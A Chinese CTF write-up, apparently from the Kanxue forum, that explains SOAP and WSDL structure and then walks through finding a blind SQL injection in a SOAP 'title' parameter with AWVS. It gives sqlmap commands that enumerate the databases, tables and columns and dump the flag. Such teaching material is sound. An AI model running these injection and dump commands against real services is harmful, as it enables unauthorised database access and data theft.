---
title: SOAP注入的介绍与实战
url: https://buaq.net/go-134326.html
source: unSafe.sh - 不安全
date: 2022-11-06
fetch_date: 2025-10-03T21:49:26.531368
---

# SOAP注入的介绍与实战

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/131dd17910cf8cea11df6187d9c004dc.jpg)

SOAP注入的介绍与实战

本文为看雪论坛优秀文章看雪论坛作者ID：mb\_tabcvksy本文将介绍SOAP的相关内容，并结合一道CTF题目进行实战练习，帮助读者更容易掌握SOAP注入。一WebServiceWebService
*2022-11-5 17:59:36
Author: [mp.weixin.qq.com(查看原文)](/jump-134326.htm)
阅读量:37
收藏*

---

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HBcsibV3mg3pia6yBox8iaum5wxRWNSA4Yt8ZP8uULq5fOeydXUdIO613fFs7wn30gKnXoO1uD5v06A/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：mb\_tabcvksy

本文将介绍SOAP的相关内容，并结合一道CTF题目进行实战练习，帮助读者更容易掌握SOAP注入。

```
一

WebService
```

WebService是一种远程调用技术，实质就是一个程序向外界暴露出了一个可通过Web调用的API，传入的参数不限制就有可能导致SQL注入等漏洞的产生。它包括三个部分：XML+XSD、SOAP、WSDL。

XML+XSD：描述、表达要传输的数据。

SOAP：交换XML编码信息的轻量级协议，以XML或XSD为载体，通过HTTP发送请求和接受结果。会在HTTP基础上增加特定消息头。

WSDL：一个基于XML的描述Web Service及函数、参数和返回值的语言。

```
二

SOAP
```

简单来说，SOAP（Simple Object Access Protocol)，简单对象访问协议，是一个可以在不同操作系统上运行的不同语言编写的应用程序之间进行传输通信的协议。

它包括四个部分：

封装：定义了一个框架，描述了消息中的内容是什么，谁应当处理它，它是可选的还是必须的。

编码规则：定义了一种序列化机制，用于交换应用程序定义的数据类型的实例。

RPC表示：定义用于表示远程过程调用和应答的协定。

SOAP绑定：约定使用底层传输协议来完成节点间交换SOAP封装。

SOAP基于HTTP协议传输，传输文本格式是XML，文档的消息结构如下：

Envelope: 将该XML文档标识为一条SOAP消息。

Header：包含头部信息。

Body：包含所有调用和响应信息。

Fault：提供处理所发生的错误的信息。

格式如下所示：

```
<?xml version="1.0"?><soap:Envelope    xmlns:soap="http://xxx/soap-envelope"    soap:encodingStyle="http://xxx/soap-encoding"> <soap:Header></soap:Header> <soap:Body>    <soap:Fault>    </soap:Fault></soap:Body> </soap:Envelope>
```

注意必须使用XML编码，Envelope、Encoding命名空间，不能包含DTD（外部实体）引用，也不包含XML处理指令。

下面将以一道CTF题目进行辅助讲解，帮助读者更好发掘SOAP注入。

```
三

CTF题目
```

题目链接现已更新为：*http://47.103.94.191:8018/*

## **判断SOAP**

打开链接后，按照提示安装数据库完成初始化操作，进入到如下界面。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT6bBYBgicVJpHEhl8ambUanSh2h7pIU6VDhZYibUEN0R5REltaSIdpJXfA/640?wx_fmt=png)
点击页面中的“WSDL”，查看xml文档。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT6gibVM0PJX9tlkbjZtPib7JnVpbWWphOvfGvyiaKicpmK975BBHoA0Gw0YQ/640?wx_fmt=png)
发现xmlns.soap等关键字，判定为SOAP类型。于是可以使用AWVS扫描探测。

## **AWVS探测**

点击Targets->Add Target->填入要探测的URL并随便填写备注->Save->默认配置，之后直接点Scan->开始扫描。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT60n8yQBUD2sLmxcQbficXMib0ib2OFl2wxU8Gia6LNmLsxsrBOfOicibjM5Hg/640?wx_fmt=png)
可以看到扫描出来了SQL注入，而且还是盲注类型。点击该漏洞，右边出现了该漏洞的详细信息，往下拉到HTTP Request。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT6LbCSOm5w7T8re9o3ic8flWiacuDRrRfeiavXa0eO5KaQ7P98kcOIIDJOw/640?wx_fmt=png)
点左上角的复制，将整个请求包复制下来，在桌面新建一个txt文件，命名为soap.txt。打开，粘贴，在title那里加一个\*（加\*是让sqlmap探测这个位置）,保存。

## **请求包构造原理**

这里解释一下该请求包后面的xml格式的内容是怎么构造出来的。

```
<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema">    <soap:Header />    <soap:Body>        <tns:get_tickets_stock>            <title>*</title>        </tns:get_tickets_stock>    </soap:Body></soap:Envelope>
```

可以发现，存在Envelope,Header,Body，但是没有Fault。要想解释清楚它是如何构造的，还需要结合原xml文档/ws\_soap.php?wsdl如下所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT6P2c6fGVWmJTKUaUekFDsibWncdmE7kn9fwr256DOZDwu86c89nLoiaBQ/640?wx_fmt=png)

1、首先在这个文档里面找到xsd:string类型的对应标签，发现它在一个name为title里面，那么说明这里就是注入的地方，因此请求包那才在<title></title>中间加上\*。

2、然后找到这个titlt所在的标签，为message，其name为：get\_tickets\_stockRequest。

3、通过这个name找到调用这个message的地方，发现它在一个input标签中。

4、随后发现它在一个operation标签里，并且这个标签的name为：get\_tickets\_stock。

因此可得到整个流程：

在body里面，首先通过<tns:get\_tickets\_stock>找到operation标签，运行标签里的输入框input，就开始调用message，通过message="tns:get\_tickets\_stockRequest"找到对应的message标签，最后运行到title那个标签。

```
<tns:get_tickets_stock>    <title>*</title></tns:get_tickets_stock>
```

之后即可开始使用sqlmap进行注入。

## **sqlmap注入**

1.获取数据库名

```
python sqlmap.py -r F:\\xxx\\soap.txt --batch --dbs
```

使用-r参数读取文件内容进行操作，后面跟的是soap.txt所在的绝对路径，--batch是在遇到选择时默认选yes，--dbs就是爆数据库名。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT65g8NADWRpksVic27e4QGIhvEMYdSqFW6hEk49zeWm2qAyqA0YY9FUMQ/640?wx_fmt=png)
得到了几个数据库名，我们要的flag就在whalwl这个数据库名中。

2.获取数据库表名

```
python sqlmap.py -r F:\\xxx\\soap.txt --batch --tables -D "whalwl"
```

根据数据库名探测表名。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT6rwgzIyJ80x2MpqfXKmGOFa3dZXr0vmoWd5Nj6HZ1Rx8a9zLcfvyfOA/640?wx_fmt=png)
得到几个表名，很明显flag应该在this\_flag表中。

3.获取数据库列名

```
python sqlmap.py -r F:\\xxx\\soap.txt --batch --columns -D "whalwl" -T "this_flag
```

根据数据库名和表名探测列名。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT6A9ibvljxqxMJn55hTguae4uXpeFnhm7PpTy5CJGWtqKbEyjBSCwgM8Q/640?wx_fmt=png)
获取到了flag列，最后获取flag内容即可。

```
python sqlmap.py -r F:\\xxx\\soap.txt --batch --dump -D "whalwl" -T "this_flag" -C "flag"
```

运行即可成功得到flag。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT6UGv21FBTyJVcUXdEYicOenl82ribXWkuRIsTrkkzXygDrzATDKEiaGvjA/640?wx_fmt=png)

*https://mp.weixin.qq.com/s/6k4O4prW8kAuXdpwNGm-yw*

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT6XgztUPJQugYUX84Jtes1Hpia67e5iaJHLHNIFIW9ELtD9wNleibbIpOhQ/640?wx_fmt=png)

**看雪ID：mb\_tabcvksy**

https://bbs.pediy.com/user-home-927464.htm

\*本文由看雪论坛 mb\_tabcvksy 原创，转载请注明来自看雪社区

[![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HOE7XGJ8oN1oR9rHNlWkT6Ne4yIhKC1JHib72ria0kibApGMibBLPoxBSkE2icialwROORLnx553kb9RCA/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458479751&idx=1&sn=ca684920ebd23cc09080ba6eefb94165&chksm=b18e5c0d86f9d51b3b31b8a99231416b78566b3365abfbe25625aeba78a44b769576548b316f&scene=21#wechat_redirect)

看雪CTF官网：https://ctf.pediy.com/

**#****往期推荐**

1.[CVE-2022-21882提权漏洞学习笔记](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471430&idx=1&sn=6a47d0c5c8f3f6204548e80977ecd059&chksm=b18e7c8c86f9f59a88d9b8e83c8297e0ef65034a73436998ab835531baadaa51f3d630793b95&scene=21#wechat_redirect)

2.[wibu证书 - 初探](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471429&idx=1&sn=a85188de9b9697fd1b9e708bb8bb1fdb&chksm=b18e7c8f86f9f59933d6cbf0040ed796f06e37b23f17f1ae842eb22257de02338e1a8d751f6b&scene=21#wechat_redirect)

3.[win10 1909逆向之APIC中断和实验](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458471421&idx=2&sn=e83cf7220dc1c4c06a2efc78593e30cc&chksm=b18e7b7786f9f2614ecce34e23be7f71a3d3516766aabda8f25ae41c81ef359a2c245503cf86&scene=21#wechat_redirect)

4.[EMET下EAF机制分析以及模拟实现](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468723&idx=2&sn=5a830d04185d80e1b6cfa639dc6c6c15&chksm=b18e71f986f9f8ef5b3c2fec51f69751e63a5d6bdbadf43b49728ba05606fc4ac63fda378c92&scene=21#wechat_redirect)

5.[sql注入学习分享](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468108&idx=1&sn=42c8ec155e13e3882cf4aeb60cdbb982&chksm=b18e0f8686f98690c9792298abb04dd243862ff8effd545dc668c7b1c682aaacf9797d899e97&scene=21#wechat_redirect)

6.[V8 Array.prototype.concat函数出现过的issues和他们的POC们](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468074&idx=2&sn=06eb27c1649bd4e3a3e43a46a9500add&chksm=b18e0e6086f9877644ba0de33658232f99213d1b1b074342260031cb529c1b7ad1b89b2e0204&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球分享**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球点赞**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球在看**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicd7icG69uHMQX9DaOnSPpTgamYf9cL...